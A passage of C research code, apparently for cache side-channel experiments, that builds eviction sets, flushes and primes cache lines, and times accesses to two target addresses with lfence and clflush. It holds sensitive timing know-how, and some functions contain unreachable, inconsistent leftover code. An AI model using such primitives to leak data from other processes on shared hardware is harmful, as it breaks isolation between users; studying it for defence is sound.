    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);

    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);

    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);

    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);


    maccess(addr11);
    maccess(addr10);
    maccess(addr9);
    maccess(addr8);
    maccess(addr7);
    maccess(addr6);
    maccess(addr5);
    maccess(addr4);
    maccess(addr3);
    maccess(addr2);
    maccess(addr1);

    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);

    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);
	asm volatile("lfence\n");
	maccess(addrA);
	asm volatile("lfence\n");
    maccess(addr12);
	asm volatile("lfence\n");



    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);

	latenci[0] = time_access(addr1);
 	latenci[1] = time_access(addr2);
	latenci[2] = time_access(addr3);
	latenci[3] = time_access(addr4);
	latenci[4] = time_access(addr5);
	latenci[5] = time_access(addr6);
	latenci[6] = time_access(addr7);
	latenci[7] = time_access(addr8);
	latenci[8] = time_access(addr9);
	latenci[9] = time_access(addr10);
	latenci[10] = time_access(addr11);
	latenci[11] = time_access(addrA);

/*	printf("EV0   %d %p\n", latenci[0], &latenci[0]);  
	printf("EV1   %d %p\n", latenci[1], &latenci[1]);  
	printf("EV2   %d %p\n", latenci[2], &latenci[2]);  
	printf("EV3   %d %p\n", latenci[3], &latenci[3]);  
	printf("EV4   %d %p\n", latenci[4], &latenci[4]);  
	printf("EV5   %d %p\n", latenci[5], &latenci[5]);  
	printf("EV6   %d %p\n", latenci[6], &latenci[6]);  
	printf("EV7   %d %p\n", latenci[7], &latenci[7]);  
	printf("EV8   %d %p\n", latenci[8], &latenci[8]);  
	printf("EV9   %d %p\n", latenci[9], &latenci[9]);  
	printf("EV10  %d %p\n", latenci[10], &latenci[10]);  
	printf("addrA %d %p\n", latenci[11], &latenci[11]); 
 	printf("\n");
*/
	printf("EV0   %d\n", latenci[0]);  
	printf("EV1   %d\n", latenci[1]);  
	printf("EV2   %d\n", latenci[2]);  
	printf("EV3   %d\n", latenci[3]);  
	printf("EV4   %d\n", latenci[4]);  
	printf("EV5   %d\n", latenci[5]);  
	printf("EV6   %d\n", latenci[6]);  
	printf("EV7   %d\n", latenci[7]);  
	printf("EV8   %d\n", latenci[8]);  
	printf("EV9   %d\n", latenci[9]);  
	printf("EV10  %d\n", latenci[10]);  
	printf("addrA %d\n", latenci[11]); 
 	printf("\n");
	fflush(stdout);

return;
//    printf("thresh %d\n", INTERRUPT_THRESHOLD);
//    printf("addrB %" PRIu32 "\n", latency);  
//    printf("addrA %" PRIu32 "\n", latency);
               
		//maccess(victim);
		//maccess(victim);
		//maccess(victim);


//		traverse_eviction_set(addr_set);

//		maccess(victim + 222); // page walk
//		latency = time_access(victim);

		if (latency1 < INTERRUPT_THRESHOLD) {
			if (debug) {
				printf("%" PRIu32 "\n", latency1);
			}

			total1 += latency1;
		} else {
			interrupt1++;
		}
		if (latency2 < INTERRUPT_THRESHOLD) {
			if (debug) {
				printf("%" PRIu32 "\n", latency2);
			}

			total2 += latency2;
		} else {
			interrupt2++;
		}
	}

	ret1 = (float)total1 / (TEST_REPETITIONS - interrupt1);
	ret2 = (float)total2 / (TEST_REPETITIONS - interrupt2);
  printf("AverageA: %" PRIu32 "\n", ret2);
  printf("AverageB: %" PRIu32 "\n", ret1);

	return ret1 > cache_miss_treshold;
}

static int test_step1(struct Node *addr_set, void *addrA, void *addrB)
{
	int i = 0, ret1 = 0, latency1 = 0, total1 = 0, interrupt1 = 0;
 	int ret2 = 0, latency2 = 0, total2 = 0, interrupt2 = 0;
  struct Node* ptr = addr_set;
  int iter = 0;
  void *addr1 = ptr->address;
  void *addr2 = ptr->next->address;
  void *addr3 = ptr->next->next->address;
  void *addr4 = ptr->next->next->next->address;
  void *addr5 = ptr->next->next->next->next->address;
  void *addr6 = ptr->next->next->next->next->next->address;
  void *addr7 = ptr->next->next->next->next->next->next->address;
  void *addr8 = ptr->next->next->next->next->next->next->next->address;
  void *addr9 = ptr->next->next->next->next->next->next->next->next->address;
  void *addr10 = ptr->next->next->next->next->next->next->next->next->next->address;
  void *addr11 = ptr->next->next->next->next->next->next->next->next->next->next->address;
  ptr = addr_set = ptr->next->next->next->next->next->next->next->next->next->next->next;
  void *addr12 = ptr->address;
  void *addr13 = ptr->next->address;
  void *addr14 = ptr->next->next->address;
  void *addr15 = ptr->next->next->next->address;
  void *addr16 = ptr->next->next->next->next->address;
  void *addr17 = ptr->next->next->next->next->next->address;
  void *addr18 = ptr->next->next->next->next->next->next->address;
  void *addr19 = ptr->next->next->next->next->next->next->next->address;
  void *addr20 = ptr->next->next->next->next->next->next->next->next->address;
  void *addr21 = ptr->next->next->next->next->next->next->next->next->next->address;
  void *addr22 = ptr->next->next->next->next->next->next->next->next->next->next->address;

	int latenci[12];
	for (i = 0; i < TEST_REPETITIONS; i++) {
    
	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);

	_mm_clflush(addrA);
	_mm_clflush(addrB);

	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);

	for(int q = 0; q < 500000; q++) {} 
    //maccess(addrA);
        
    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);
  
    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);

    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);

    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);

    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);

    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);

    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);
	maccess(addrA);

    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);

    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);

    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);

    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);

    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);

    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);
	asm volatile("lfence\n");

    maccess(addrA);
	asm volatile("lfence\n");
    maccess(addrB);
	asm volatile("lfence\n");

    maccess(addr12);
	asm volatile("lfence\n");
    maccess(addr13);
	asm volatile("lfence\n");
    maccess(addr14);
	asm volatile("lfence\n");
    maccess(addr15);
	asm volatile("lfence\n");
    maccess(addr16);
	asm volatile("lfence\n");
    maccess(addr17);
	asm volatile("lfence\n");
    maccess(addr18);
	asm volatile("lfence\n");
    maccess(addr19);
	asm volatile("lfence\n");
    maccess(addr20);
	asm volatile("lfence\n");
    maccess(addr21);
	asm volatile("lfence\n");

    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);


 	latenci[0] = time_access(addr12);
	latenci[1] = time_access(addr13);
	latenci[2] = time_access(addr14);
	latenci[3] = time_access(addr15);
	latenci[4] = time_access(addr16);
	latenci[5] = time_access(addr17);
	latenci[6] = time_access(addr18);
	latenci[7] = time_access(addr19);
	latenci[8] = time_access(addr20);
	latenci[9] = time_access(addr21);
	latenci[10] = time_access(addrA);
	latenci[11] = time_access(addrB);

/*	printf("EV0   %d %p\n", latenci[0], &latenci[0]);  
	printf("EV1   %d %p\n", latenci[1], &latenci[1]);  
	printf("EV2   %d %p\n", latenci[2], &latenci[2]);  
	printf("EV3   %d %p\n", latenci[3], &latenci[3]);  
	printf("EV4   %d %p\n", latenci[4], &latenci[4]);  
	printf("EV5   %d %p\n", latenci[5], &latenci[5]);  
	printf("EV6   %d %p\n", latenci[6], &latenci[6]);  
	printf("EV7   %d %p\n", latenci[7], &latenci[7]);  
	printf("EV8   %d %p\n", latenci[8], &latenci[8]);  
	printf("EV9   %d %p\n", latenci[9], &latenci[9]);  
	printf("EV10  %d %p\n", latenci[10], &latenci[10]);  
	printf("addrA %d %p\n", latenci[11], &latenci[11]); 
 	printf("\n");
*/
if(debug) {
	printf("EV11   %d\n", latenci[0]);  
	printf("EV12   %d\n", latenci[1]);  
	printf("EV13   %d\n", latenci[2]);  
	printf("EV14   %d\n", latenci[3]);  
	printf("EV15   %d\n", latenci[4]);  
	printf("EV16   %d\n", latenci[5]);  
	printf("EV17   %d\n", latenci[6]);  
	printf("EV18   %d\n", latenci[7]);  
	printf("EV19   %d\n", latenci[8]);  
	printf("EV20   %d\n", latenci[9]);  
	printf("addrA  %d\n", latenci[10]);  
	printf("addrB  %d\n", latenci[11]); 
 	printf("\n");
}
	fflush(stdout);

return;
//    printf("thresh %d\n", INTERRUPT_THRESHOLD);
//    printf("addrB %" PRIu32 "\n", latency);  
//    printf("addrA %" PRIu32 "\n", latency);
               
		//maccess(victim);
		//maccess(victim);
		//maccess(victim);


//		traverse_eviction_set(addr_set);

//		maccess(victim + 222); // page walk
//		latency = time_access(victim);

		if (latency1 < INTERRUPT_THRESHOLD) {
			if (debug) {
				printf("%" PRIu32 "\n", latency1);
			}

			total1 += latency1;
		} else {
			interrupt1++;
		}
		if (latency2 < INTERRUPT_THRESHOLD) {
			if (debug) {
				printf("%" PRIu32 "\n", latency2);
			}

			total2 += latency2;
		} else {
			interrupt2++;
		}
	}

	ret1 = (float)total1 / (TEST_REPETITIONS - interrupt1);
	ret2 = (float)total2 / (TEST_REPETITIONS - interrupt2);
  printf("AverageA: %" PRIu32 "\n", ret2);
  printf("AverageB: %" PRIu32 "\n", ret1);

	return ret1 > cache_miss_treshold;
}

static int test_eviction_setAB(struct Node *addr_set, void *addrA, void *addrB, int *timeA, int *timeB)
{
	struct Node* ptr = addr_set;
	void *addr1 = ptr->address;
	void *addr2 = ptr->next->address;
	void *addr3 = ptr->next->next->address;
	void *addr4 = ptr->next->next->next->address;
	void *addr5 = ptr->next->next->next->next->address;
	void *addr6 = ptr->next->next->next->next->next->address;
	void *addr7 = ptr->next->next->next->next->next->next->address;
	void *addr8 = ptr->next->next->next->next->next->next->next->address;
	void *addr9 = ptr->next->next->next->next->next->next->next->next->address;
	void *addr10 = ptr->next->next->next->next->next->next->next->next->next->address;
	void *addr11 = ptr->next->next->next->next->next->next->next->next->next->next->address;
	ptr = addr_set = ptr->next->next->next->next->next->next->next->next->next->next->next;
	void *addr12 = ptr->address;
	void *addr13 = ptr->next->address;
	void *addr14 = ptr->next->next->address;
	void *addr15 = ptr->next->next->next->address;
	void *addr16 = ptr->next->next->next->next->address;
	void *addr17 = ptr->next->next->next->next->next->address;
	void *addr18 = ptr->next->next->next->next->next->next->address;
	void *addr19 = ptr->next->next->next->next->next->next->next->address;
	void *addr20 = ptr->next->next->next->next->next->next->next->next->address;
	void *addr21 = ptr->next->next->next->next->next->next->next->next->next->address;
	void *addr22 = ptr->next->next->next->next->next->next->next->next->next->next->address;
	int latenci[12];

	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);

	_mm_clflush(addrA);
	_mm_clflush(addrB);

	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);

	for(int q = 0; q < 500000; q++) {} // Wait on clflushes

    
	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);
	maccess(addrA);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	asm volatile("lfence\n");
	maccess(addrA);
	asm volatile("lfence\n");
	maccess(addrB);
	asm volatile("lfence\n");

	maccess(addr12);
	asm volatile("lfence\n");
	maccess(addr13);
	asm volatile("lfence\n");
	maccess(addr14);
	asm volatile("lfence\n");
	maccess(addr15);
	asm volatile("lfence\n");
	maccess(addr16);
	asm volatile("lfence\n");
	maccess(addr17);
	asm volatile("lfence\n");
	maccess(addr18);
	asm volatile("lfence\n");
	maccess(addr19);
	asm volatile("lfence\n");
	maccess(addr20);
	asm volatile("lfence\n");
	maccess(addr21);
	asm volatile("lfence\n");

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);


	latenci[0] = time_access(addr12);
	latenci[1] = time_access(addr13);
	latenci[2] = time_access(addr14);
	latenci[3] = time_access(addr15);
	latenci[4] = time_access(addr16);
	latenci[5] = time_access(addr17);
	latenci[6] = time_access(addr18);
	latenci[7] = time_access(addr19);
	latenci[8] = time_access(addr20);
	latenci[9] = time_access(addr21);
	latenci[11] = time_access(addrB);
	latenci[10] = time_access(addrA);



/*
	printf("EV0   %d %p\n", latenci[0], &latenci[0]);  
	printf("EV1   %d %p\n", latenci[1], &latenci[1]);  
	printf("EV2   %d %p\n", latenci[2], &latenci[2]);  
	printf("EV3   %d %p\n", latenci[3], &latenci[3]);  
	printf("EV4   %d %p\n", latenci[4], &latenci[4]);  
	printf("EV5   %d %p\n", latenci[5], &latenci[5]);  
	printf("EV6   %d %p\n", latenci[6], &latenci[6]);  
	printf("EV7   %d %p\n", latenci[7], &latenci[7]);  
	printf("EV8   %d %p\n", latenci[8], &latenci[8]);  
	printf("EV9   %d %p\n", latenci[9], &latenci[9]);  
	printf("EV10  %d %p\n", latenci[10], &latenci[10]);  
	printf("addrA %d %p\n", latenci[11], &latenci[11]); 
	printf("\n");
*/

	for(int m = 0; m < 12; m++) {
		if(get_cache_set_index(&latenci[m], 3) == my_set) {
			printf("[!] Same Cache Set for storing latencies\n"); 
			return -1;
		}
	}

	if (latenci[10] > INTERRUPT_THRESHOLD || latenci[11] > INTERRUPT_THRESHOLD) {
		return -1;
	}

	if(debug) {
		printf("EV11[set%d]   %d\n", get_cache_set_index(&latenci[0], 3), latenci[0]);  
		printf("EV12[set%d]   %d\n", get_cache_set_index(&latenci[1], 3), latenci[1]);  
		printf("EV13[set%d]   %d\n", get_cache_set_index(&latenci[2], 3), latenci[2]);  
		printf("EV14[set%d]   %d\n", get_cache_set_index(&latenci[3], 3), latenci[3]);  
		printf("EV15[set%d]   %d\n", get_cache_set_index(&latenci[4], 3), latenci[4]);  
		printf("EV16[set%d]   %d\n", get_cache_set_index(&latenci[5], 3), latenci[5]);  
		printf("EV17[set%d]   %d\n", get_cache_set_index(&latenci[6], 3), latenci[6]);  
		printf("EV18[set%d]   %d\n", get_cache_set_index(&latenci[7], 3), latenci[7]);  
		printf("EV19[set%d]   %d\n", get_cache_set_index(&latenci[8], 3), latenci[8]);  
		printf("EV20[set%d]   %d\n", get_cache_set_index(&latenci[9], 3), latenci[9]);  
		printf("addrA[set%d]  %d\n", get_cache_set_index(&latenci[10], 3), latenci[10]);  
		printf("addrB[set%d]  %d\n", get_cache_set_index(&latenci[11], 3), latenci[11]); 
	 	printf("\n");
		fflush(stdout);
	}

	*timeA = latenci[10];
	*timeB = latenci[11];

	return 0;
}

static int test_eviction_setBA(struct Node *addr_set, void *addrA, void *addrB, int *timeA, int *timeB)
{
	struct Node* ptr = addr_set;
	void *addr1 = ptr->address;
	void *addr2 = ptr->next->address;
	void *addr3 = ptr->next->next->address;
	void *addr4 = ptr->next->next->next->address;
	void *addr5 = ptr->next->next->next->next->address;
	void *addr6 = ptr->next->next->next->next->next->address;
	void *addr7 = ptr->next->next->next->next->next->next->address;
	void *addr8 = ptr->next->next->next->next->next->next->next->address;
	void *addr9 = ptr->next->next->next->next->next->next->next->next->address;
	void *addr10 = ptr->next->next->next->next->next->next->next->next->next->address;
	void *addr11 = ptr->next->next->next->next->next->next->next->next->next->next->address;
	ptr = addr_set = ptr->next->next->next->next->next->next->next->next->next->next->next;
	void *addr12 = ptr->address;
	void *addr13 = ptr->next->address;
	void *addr14 = ptr->next->next->address;
	void *addr15 = ptr->next->next->next->address;
	void *addr16 = ptr->next->next->next->next->address;
	void *addr17 = ptr->next->next->next->next->next->address;
	void *addr18 = ptr->next->next->next->next->next->next->address;
	void *addr19 = ptr->next->next->next->next->next->next->next->address;
	void *addr20 = ptr->next->next->next->next->next->next->next->next->address;
	void *addr21 = ptr->next->next->next->next->next->next->next->next->next->address;
	void *addr22 = ptr->next->next->next->next->next->next->next->next->next->next->address;
	int latenci[12];

	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);

	_mm_clflush(addrA);
	_mm_clflush(addrB);

	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);

	for(int q = 0; q < 500000; q++) {} // Wait on clflushes

    
	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
